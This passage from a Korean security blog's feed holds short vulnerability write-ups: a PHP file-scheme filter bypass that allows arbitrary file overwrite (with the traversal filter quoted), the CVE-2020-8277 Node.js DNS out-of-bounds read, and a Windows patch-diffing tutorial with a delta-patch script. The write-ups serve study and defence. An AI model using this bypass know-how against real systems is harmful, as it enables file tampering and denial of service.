&#xCDE8;&#xC57D;&#xC810; &#xB610;&#xD55C; CVE-2020-28948&#xACFC; &#xAC19;&#xC740; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C;, <code>file://</code> scheme&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC0AC;&#xB97C; &#xD558;&#xC9C0; &#xC54A;&#xC544; &#xD574;&#xCEE4;&#xAC00; &#xC784;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. php&#xAC00; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xC5C8;&#xB2E4;&#xBA74; <code>/etc/passwd</code> &#xD30C;&#xC77C;&#xC744; &#xD3EC;&#xD568;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C; &#xD30C;&#xC77C; &#xB610;&#xD55C; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_maliciousFilename</span>(<span class="hljs-params">$file</span>)</span><span class="hljs-function"></span>{    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&apos;://&apos;</span>) === <span class="hljs-number">0</span>) {        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    }    <span class="hljs-keyword">if</span> (strpos($file, <span class="hljs-string">&apos;../&apos;</span>) !== <span class="hljs-literal">false</span> || strpos($file, <span class="hljs-string">&apos;..\\\\&apos;</span>) !== <span class="hljs-literal">false</span>) {        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    }    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;}</code></pre><p>&#xC774; &#xB450; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xBB38;&#xC790;&#xC5F4;&#xC5D0; <code>phar://</code> &#xAC00; &#xC544;&#xB2CC; <code>://</code> &#xAC00; &#xD3EC;&#xD568;&#xB420; &#xACBD;&#xC6B0; &#xC774;&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>bypass</tag>
      
      <tag>L0ch</tag>
      
      <tag>unserialization</tag>
      
      <tag>arbitrary file overwrite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-8277: Node.js OOB Read를 통한 Denial of Service</title>
    <link href="/2020/11/30/idioth/2020-11-30/"/>
    <url>/2020/11/30/idioth/2020-11-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://livingbeef.blogspot.com/2020/11/cve-2020-8277-analysis-from-nodejs-code.html">CVE-2020-8277 Analysis: From Node.JS code to OOB Reads/Fail-Check</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Node.js<ul><li>&lt; 15.2.1</li><li>&lt; 14.15.1</li><li>&lt; 12.19.1</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Node.js&#xC5D0;&#xC11C; OOB(Out of Bounds) Read&#xB97C; &#xD1B5;&#xD574; Denial of Service&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB9CE;&#xC740; &#xC591;&#xC758; DNS record&#xB97C; <a href="https://github.com/nodejs/node/blob/642174a31f7c2d3a8352002095d35a2b34c1126c/src/cares_wrap.cc">c-ares &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;</a>&#xC5D0;&#xC11C; TTL record&#xB97C; parsing &#xD560; &#xB54C; &#xBC30;&#xC5F4; &#xAE38;&#xC774;&#xC758; &#xACC4;&#xC0B0;&#xC744; &#xC798;&#xBABB;&#xD558;&#xBA74;&#xC11C; &#xC77C;&#xC5B4;&#xB098;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p>c-ares &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC758; <code>ares_parse_aaaa_reply</code> &#xD568;&#xC218;&#xB294; response&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; <code>char* abuffer</code>, response&#xC758; &#xAE38;&#xC774;&#xC778; <code>alen</code>, DNS response&#xAC00; &#xBC18;&#xD658;&#xB420; &#xAD6C;&#xC870;&#xCCB4; &#xD3EC;&#xC778;&#xD130; <code>host</code>, TTL &#xBC30;&#xC5F4;&#xC778; <code>addrttls / naddrttls</code>&#xB97C; &#xC778;&#xC790;&#xB85C; &#xAC16;&#xC2B5;&#xB2C8;&#xB2E4;. <code>addrttls</code>&#xB294; &#xBC18;&#xD658;&#xB41C; TTL&#xC758; &#xC8FC;&#xC18C;&#xB85C; &#xCC44;&#xC6CC;&#xC9C0;&#xB294; &#xBC30;&#xC5F4;&#xC774;&#xACE0;, <code>naddrttls</code>&#xB294; &#xBC18;&#xD658;&#xD560; TTL&#xC758; &#xCD5C;&#xB300; &#xAC12;&#xC785;&#xB2C8;&#xB2E4;. response&#xC758; reply &#xAC1C;&#xC218;&#xAC00; <code>addrttls</code> &#xBC30;&#xC5F4;&#xBCF4;&#xB2E4; &#xD074; &#xACBD;&#xC6B0;  <code>naddrttls</code>&#xC5D0;&#xC11C; &#xD655;&#xC778; &#xD6C4; 256&#xAC1C;&#xC758; TTL&#xB9CC; &#xCC98;&#xB9AC;&#xB418;&#xACE0; &#xB098;&#xBA38;&#xC9C0; &#xBD80;&#xBD84;&#xC740; &#xC798;&#xB9AC;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xCDE8;&#xC57D;&#xC810;&#xC740; TTL&#xC758; &#xAC1C;&#xC218;&#xC5D0; &#xB300;&#xD55C; &#xC798;&#xBABB;&#xB41C; &#xCC98;&#xB9AC;&#xAC00; &#xC544;&#xB2C8;&#xB77C; response&#xC758; reply &#xAC1C;&#xC218;&#xB97C; &#xC798;&#xBABB; &#xACC4;&#xC0B0;&#xD558;&#xB294; &#xAC83;&#xC5D0;&#xC11C; &#xC77C;&#xC5B4;&#xB0A9;&#xB2C8;&#xB2E4;.</p><ol><li>reply&#xC758; &#xAC1C;&#xC218;&#xB97C; &#xC0C8;&#xC11C; <code>naddrs</code>&#xC5D0; &#xC800;&#xC7A5;</li><li>TTL &#xBC30;&#xC5F4; &#xC791;&#xC131;(<code>naddrttls</code>&#xC5D0; &#xC758;&#xD574; &#xC798;&#xB9B0; <code>addrttls</code>)</li><li><code>naddrttls</code> &#xC7AC;&#xC791;&#xC131; - &#xC2E4;&#xC81C; TTL &#xBC30;&#xC5F4;&#xC5D0; &#xC791;&#xC131;&#xB41C; &#xAC12;&#xBCF4;&#xB2E4; &#xD070; &#xC9C0; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xACE0; <code>naddrs</code>&#xB97C; &#xC9D1;&#xC5B4;&#xB123;&#xC74C;</li></ol><p>&#xB530;&#xB77C;&#xC11C; &#xBC18;&#xD658;&#xB41C; <code>naddrttls</code>&#xAC00; &#xC791;&#xC131;&#xB41C; reply&#xC758; TTL &#xAC1C;&#xC218;&#xBCF4;&#xB2E4; &#xCEE4;&#xC9C0;&#xBBC0;&#xB85C; OOB read&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD558;&#xC5EC; Denial of Service &#xACF5;&#xACA9;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>naddrttls</code>&#xC5D0; <code>naddrs</code> &#xAC12;&#xC744; &#xB123;&#xC744; &#xB54C; <code>naddrs</code>&#xC758; &#xAC12;&#xC774; <code>naddrttls</code>&#xBCF4;&#xB2E4; &#xD074; &#xACBD;&#xC6B0; <code>naddrttls</code> &#xAC12;&#xC744; &#xB123;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span>(naddrttls){*naddrttls = (naddrs &gt; *naddrsttls) ? *naddrttls:naddrs;}</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>dos</tag>
      
      <tag>idioth</tag>
      
      <tag>node.js</tag>
      
      <tag>oob read</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Windows Patch Diffing 맛보기 Part 2</title>
    <link href="/2020/11/29/l0ch/windows-patch-diffing-part2/"/>
    <url>/2020/11/29/l0ch/windows-patch-diffing-part2/</url>
    
    <content type="html"><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; &#xC5EC;&#xB7EC;&#xBD84;! L0ch&#xC785;&#xB2C8;&#xB2E4;. &#xC9C0;&#xB09C; Windows Patch Diffing&#xAE00;&#xC758; &#xBD84;&#xB7C9; &#xC870;&#xC808; &#xC2E4;&#xD328;&#xB85C; &#xD30C;&#xD2B8; 1&#xC5D0; &#xC774;&#xC5B4; &#xD30C;&#xD2B8; 2&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;! </p><p><a href="https://hackyboiz.github.io/2020/11/15/l0ch/windows-patch-diffing-part1/">[Research]WIndows Patch Diffing &#xB9DB;&#xBCF4;&#xAE30; Part 1</a></p><p>&#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xD328;&#xD0A4;&#xC9C0; &#xCD94;&#xCD9C;&#xB3C4; &#xD588;&#xC73C;&#xB2C8; &#xC774;&#xC81C; &#xC9C4;&#xC9DC; &#xD328;&#xCE58; diffing&#xC744; &#xC2DC;&#xC791;&#x2026;&#xD558;&#xAE30; &#xC804;&#xC5D0;! &#xD574;&#xC57C; &#xD560;&#xAC8C; &#xD55C; &#xAC00;&#xC9C0; &#xB354; &#xB0A8;&#xC544;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/1.png" alt></p><blockquote><p>&#xC544;&#xB2C8; &#xADF8;&#xB7FC; diffing&#xC740; &#xB300;&#xCCB4; &#xC5B8;&#xC81C; &#xD568;?</p></blockquote><p>&#xC708;&#xB3C4;&#xC6B0;&#xC5D0;&#xC11C; &#xD328;&#xCE58;&#xB97C; &#xD560; &#xB54C; &#xC5B4;&#xB5A4; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD558;&#xB294;&#xC9C0;&#xB97C; &#xBA3C;&#xC800; &#xC54C;&#xC544;&#xBD10;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC57C; diffing &#xD560; &#xBC84;&#xC804; &#xBCC4; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC694; &#x314E;&#x314E;</p><h1 id="&#xD328;&#xCE58;-&#xD30C;&#xC77C;-&#xC720;&#xD615;"><a href="#&#xD328;&#xCE58;-&#xD30C;&#xC77C;-&#xC720;&#xD615;" class="headerlink" title="&#xD328;&#xCE58; &#xD30C;&#xC77C; &#xC720;&#xD615;"></a>&#xD328;&#xCE58; &#xD30C;&#xC77C; &#xC720;&#xD615;</h1><p>&#xC774;&#xC804; &#xAE00;&#xC5D0;&#xC11C; &#xCD94;&#xCD9C;&#xD55C; null, forward, reverse differential&#xC5D0; &#xB300;&#xD574; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC0B4;&#xD3B4;&#xBD24;&#xC5C8;&#xC8E0;. &#xC774; diff &#xC720;&#xD615;&#xC758; &#xD30C;&#xC77C;&#xB4E4;&#xC740; diffing &#xD560; &#xBC84;&#xC804;&#xBCC4; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xB370; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><p>Forward diff</p><ul><li>&#xAE30;&#xBCF8; &#xBC14;&#xC774;&#xB108;&#xB9AC; (.1)&#xB97C; &#xD2B9;&#xC815; &#xD328;&#xCE58; &#xC218;&#xC900;&#xAE4C;&#xC9C0; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;.</li></ul></li><li><p>Reverse diff</p><ul><li>&#xD328;&#xCE58;&#xAC00; &#xC801;&#xC6A9;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xAE30;&#xBCF8; &#xBC14;&#xC774;&#xB108;&#xB9AC; (.1)&#xB85C; &#xB864;&#xBC31;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li><li><p>NULL diff</p><ul><li><p>&#xD328;&#xCE58;&#xC5D0;&#xC11C; &#xC0C8; &#xD30C;&#xC77C;&#xC774; &#xCD94;&#xAC00;&#xB420; &#xACBD;&#xC6B0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&lt;/br&gt;</p></li></ul></li></ul><p>diff &#xD30C;&#xC77C;&#xC744; &#xC774;&#xC6A9;&#xD55C; Windows&#xC758; &#xD328;&#xCE58; &#xACFC;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. </p><ol><li>&#xAE30;&#xC874; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xBC84;&#xC804;&#xC5D0; &#xB9DE;&#xB294; reverse diff &#xD30C;&#xC77C;&#xB85C; &#xB378;&#xD0C0; &#xD328;&#xCE58;&#xD574; &#xAE30;&#xBCF8; &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xB864;&#xBC31;</li><li>&#xD328;&#xCE58; &#xD328;&#xD0A4;&#xC9C0;&#xC5D0;&#xC11C; &#xCD94;&#xCD9C;&#xD55C; forward diff &#xD30C;&#xC77C;&#xB85C; &#xB378;&#xD0C0; &#xD328;&#xCE58;</li></ol><ul><li><p>NULL diff&#xC77C; &#xACBD;&#xC6B0; &#xD328;&#xCE58;&#xD560; &#xACBD;&#xB85C;&#xC5D0; &#xBCF5;&#xC0AC;</p><p>&lt;/br&gt;</p></li></ul><p>&#xC6B0;&#xB9AC;&#xAC00; diffing &#xD560; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xAD6C;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><code>C:\system32\WinSxS</code> &#xC5D0;&#xC11C; diffing &#xD560; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xCC3E;&#xC2B5;&#xB2C8;&#xB2E4;. WinSxS&#xC5D0;&#xB294; diff &#xD30C;&#xC77C;&#xBFD0;&#xB9CC; &#xC544;&#xB2C8;&#xB77C; &#xD574;&#xB2F9; &#xBC84;&#xC804;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB3C4; &#xD568;&#xAED8; &#xB4E4;&#xC5B4;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xD574;&#xB2F9; &#xBC84;&#xC804;&#xC758; reverse diff&#xB85C; &#xB378;&#xD0C0; &#xD328;&#xCE58;&#xD574; &#xAE30;&#xBCF8; &#xBC84;&#xC804; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB85C; &#xB864;&#xBC31;&#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xCD94;&#xCD9C;&#xD55C; &#xD328;&#xCE58; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xD328;&#xCE58;&#xD560; &#xBC84;&#xC804;&#xC758; forward diff&#xB85C; &#xB378;&#xD0C0; &#xD328;&#xCE58;&#xB97C; &#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xD328;&#xCE58;&#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC758; hash&#xB97C; &#xAD6C;&#xD558;&#xACE0; manifest hash&#xC640; &#xBE44;&#xAD50;&#xD574; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><h1 id="&#xD328;&#xCE58;-&#xC801;&#xC6A9;"><a href="#&#xD328;&#xCE58;-&#xC801;&#xC6A9;" class="headerlink" title="&#xD328;&#xCE58; &#xC801;&#xC6A9;"></a>&#xD328;&#xCE58; &#xC801;&#xC6A9;</h1><p><code>ntoskrnl.exe</code> &#xC758; &#xBC84;&#xC804; &#xBCC4; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD574;&#xC11C; diffing &#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>diffing &#xB300;&#xC0C1; &#xC120;&#xC815;&#xC740; &#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4;&#xC640; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD328;&#xCE58; &#xB9B4;&#xB9AC;&#xC988; &#xBC84;&#xC804;&#xC744; &#xBCF4;&#xACE0; &#xD310;&#xB2E8;&#xD558;&#xBA74; &#xB418;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>powershell&#xC5D0;&#xC11C; &#xB2E4;&#xC74C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC785;&#xB825;&#xD558;&#xBA74; WinSxS&#xC5D0; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB41C; &#xBC84;&#xC804;&#xBCC4; differential &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>Get-ChildItem -Recurse C:\windows\WinSxS\ | ? {$_.Name -eq &quot;ntoskrnl.exe&quot;}</code><br><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/2.png" alt></p><p>&#xD658;&#xACBD;&#xB9C8;&#xB2E4; &#xB204;&#xC801;&#xB41C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xAC00; &#xB2EC;&#xB77C;&#xC11C; &#xACB0;&#xACFC;&#xB294; &#xB2E4;&#xB97C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xD604;&#xC7AC; &#xC81C; &#xC708;&#xB3C4;&#xC6B0; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; <code>ntoskrnl.exe</code> &#xBC84;&#xC804;&#xC778; 10.0.18362.1082&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xD574; &#xBCFC;&#xAC8C;&#xC694;.</p><p>&#xD604;&#xC7AC; ntoskrnl.exe &#xBC84;&#xC804; - 10.0.18362.1082</p><p>&#xCD94;&#xCD9C;&#xD55C; ntoskrnl.exe &#xBC84;&#xC804; - 10.0.18362.1016</p><p>1082 &#xBC84;&#xC804;&#xC740; &#xC81C; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC774;&#xBBF8; &#xC788;&#xC73C;&#xB2C8; 1016 &#xBC84;&#xC804;&#xC744; &#xB378;&#xD0C0; &#xD328;&#xCE58;&#xB85C; &#xC0DD;&#xC131;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h2 id="Patch-Script"><a href="#Patch-Script" class="headerlink" title="Patch Script"></a>Patch Script</h2><p>diff &#xD328;&#xCE58;&#xC5D0;&#xB294; ms&#xC5D0;&#xC11C; &#xC9C0;&#xC6D0;&#xD558;&#xB294; patch API&#xC778; <code>msdelta.dll</code> &#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Vista &#xC774;&#xC0C1; Windows&#xC5D0;&#xC11C;&#xB294; <code>msdelta.dll</code> &#xC774; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xB0B4;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xAC00;&#xC838;&#xB2E4;&#xAC00; &#xC4F0;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB418;&#xC8E0; &#x314E;&#x314E;</p><p>&#xC544;&#xB798;&#xB294; &#xD30C;&#xC774;&#xC36C;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xC791;&#xC131;&#xD55C; msdelta &#xD328;&#xCE58; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> (windll, wintypes, c_uint64, cast, POINTER, Union, c_ubyte, LittleEndianStructure, byref, c_size_t)<span class="hljs-keyword">import</span> zlib<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> hashlib<span class="hljs-keyword">import</span> argparse<span class="hljs-keyword">import</span> struct<span class="hljs-comment"># types and flags</span>DELTA_FLAG_TYPE             = c_uint64DELTA_FLAG_NONE             = <span class="hljs-number">0x00000000</span>DELTA_APPLY_FLAG_ALLOW_PA19 = <span class="hljs-number">0x00000001</span><span class="hljs-comment"># struct</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DELTA_INPUT</span>(<span class="hljs-params">LittleEndianStructure</span>):</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">U1</span>(<span class="hljs-params">Union</span>):</span>_fields_ = [(<span class="hljs-string">&apos;lpcStart&apos;</span>, wintypes.LPVOID),(<span class="hljs-string">&apos;lpStart&apos;</span>, wintypes.LPVOID)]_anonymous_ = (<span class="hljs-string">&apos;u1&apos;</span>,)_fields_ = [(<span class="hljs-string">&apos;u1&apos;</span>, U1),(<span class="hljs-string">&apos;uSize&apos;</span>, c_size_t),(<span class="hljs-string">&apos;Editable&apos;</span>, wintypes.BOOL)]<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DELTA_OUTPUT</span>(<span class="hljs-params">LittleEndianStructure</span>):</span>_fields_ = [(<span class="hljs-string">&apos;lpStart&apos;</span>, wintypes.LPVOID),(<span class="hljs-string">&apos;uSize&apos;</span>, c_size_t)]ApplyDeltaB = windll.msdelta.ApplyDeltaBApplyDeltaB.argtypes = [DELTA_FLAG_TYPE, DELTA_INPUT, DELTA_INPUT,                        POINTER(DELTA_OUTPUT)]ApplyDeltaB.rettype = wintypes.BOOLDeltaFree = windll.msdelta.DeltaFreeDeltaFree.argtypes = [wintypes.LPVOID]DeltaFree.rettype = wintypes.BOOLgle = windll.kernel32.GetLastError<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">apply_patches</span>(<span class="hljs-params">buf, buf_len, patch_path</span>):</span><span class="hljs-keyword">with</span> open(patch_path, <span class="hljs-string">&apos;rb&apos;</span>) <span class="hljs-keyword">as</span> p:patch = p.read()<span class="hljs-keyword">if</span> patch[:<span class="hljs-number">2</span>] != <span class="hljs-string">b&quot;PA&quot;</span>:patch_offset = patch.find(<span class="hljs-string">b&quot;PA&quot;</span>)<span class="hljs-keyword">if</span> patch_offset != <span class="hljs-number">4</span>:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Invalid Patch&quot;</span>)<span class="hljs-comment"># Check CRC</span>crc = int.from_bytes(patch[:<span class="hljs-number">4</span>], byteorder = <span class="hljs-string">&quot;little&quot;</span>)patch_contents = patch[<span class="hljs-number">4</span>:]<span class="hljs-keyword">if</span> zlib.crc32(patch_contents) != crc:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;CRC check failed&quot;</span>)flag = DELTA_FLAG_NONEd_dest = DELTA_INPUT()d_src = DELTA_INPUT()d_out = DELTA_OUTPUT()d_src.lpcStart = bufd_src.uSize = buf_lend_src.Editable = <span class="hljs-literal">False</span>d_dest.lpcStart = cast(patch_contents, wintypes.LPVOID)d_dest.uSize = len(patch_contents)d_dest.Editable = <span class="hljs-literal">False</span>status = ApplyDeltaB(flag, d_src, d_dest, byref(d_out))<span class="hljs-keyword">if</span> status == <span class="hljs-number">0</span>:<span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Patch &quot;</span>+ patch_path + <span class="hljs-string">&quot; failed with Error code &quot;</span>+str(gle()))<span class="hljs-keyword">return</span> (d_out.lpStart, d_out.uSize)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:ap = argparse.ArgumentParser()mode = ap.add_mutually_exclusive_group(required=<span class="hljs-literal">True</span>)mode.add_argument(<span class="hljs-string">&quot;-i&quot;</span>, <span class="hljs-string">&quot;--input&quot;</span>, help=<span class="hljs-string">&quot;revese/forward diff file path&quot;</span>)mode.add_argument(<span class="hljs-string">&quot;-n&quot;</span>, <span class="hljs-string">&quot;--null&quot;</span>, action=<span class="hljs-string">&quot;store_true&quot;</span>, default=<span class="hljs-literal">False</span>, help=<span class="hljs-string">&quot;Create file from null diff&quot;</span>)ap.add_argument(<span class="hljs-string">&quot;-o&quot;</span>, <span class="hljs-string">&quot;--output&quot;</span>, required=<span class="hljs-literal">True</span> , help=<span class="hljs-string">&quot;write patched file&quot;</span>)ap.add_argument(<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-string">&quot;--patches&quot;</span>, required=<span class="hljs-literal">True</span>, nargs=<span class="hljs-string">&apos;+&apos;</span>, help=<span class="hljs-string">&quot;Patches path to apply&quot;</span>)args = ap.parse_args()<span class="hljs-keyword">with</span> open(args.input, <span class="hljs-string">&apos;rb&apos;</span>) <span class="hljs-keyword">as</span> r:inbuf = r.read()buf_len = len(inbuf)buf = cast(inbuf, wintypes.LPVOID) <span class="hljs-comment"># cast to void * pointer</span>alloc_list = []<span class="hljs-keyword">for</span> patch <span class="hljs-keyword">in</span> args.patches:buf, buf_len = apply_patches(buf, buf_len, patch)alloc_list.append(buf)output_buf = bytes((c_ubyte*buf_len).from_address(buf))<span class="hljs-keyword">with</span> open(args.output, <span class="hljs-string">&apos;wb&apos;</span>) <span class="hljs-keyword">as</span> w:w.write(output_buf)<span class="hljs-keyword">for</span> alloc <span class="hljs-keyword">in</span> alloc_list:DeltaFree(alloc)hash = hashlib.sha256(output_buf)print(str(len(args.patches)) + <span class="hljs-string">&quot; pathces successfully applied.&quot;</span>)print(<span class="hljs-string">&quot;hash : &quot;</span> + base64.b64encode(hash.digest()).decode())</code></pre><p>&#xC635;&#xC158; &#xBCC4; &#xAE30;&#xB2A5;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>-i :  reverse &#xB610;&#xB294; forward differential &#xD328;&#xCE58; &#xD560; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xC9C0;&#xC815;</p><p>-n : null differential</p><p>-o : &#xD328;&#xCE58; &#xB41C; &#xACB0;&#xACFC; &#xD30C;&#xC77C; &#xC0DD;&#xC131;</p><p>-p : &#xD328;&#xCE58; diff&#xD30C;&#xC77C; &#xC9C0;&#xC815;</p><p>&lt;/br&gt;</p><pre><code class="hljs powershell">python delta_patch.py <span class="hljs-literal">-i</span> C:\\Windows\\WinSxS\\amd64...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1082</span>\\ntoskrnl.exe ^<span class="hljs-literal">-o</span> result_ntoskrnl.exe <span class="hljs-literal">-p</span> C:\\Windows\\WinSxS\\amd64...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1082</span>\\r\\ntoskrnl.exe</code></pre><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/3.png" alt></p><p>1082 &#xBC84;&#xC804;&#xC758; <code>ntoskrnl.exe</code>&#xB97C; &#xAC19;&#xC740; &#xBC84;&#xC804;&#xC758; reverse diff &#xD30C;&#xC77C;&#xB85C; &#xD328;&#xCE58;&#xD574; &#xAE30;&#xBCF8; &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xB864;&#xBC31;&#xD55C; &#xACB0;&#xACFC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC0AC;&#xC9C4;&#xACFC; &#xAC19;&#xC774; successfully applied &#xBA54;&#xC2DC;&#xC9C0;&#xC640; hash &#xAC12;&#xC774; &#xB728;&#xBA74; &#xD328;&#xCE58;&#xAC00; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; 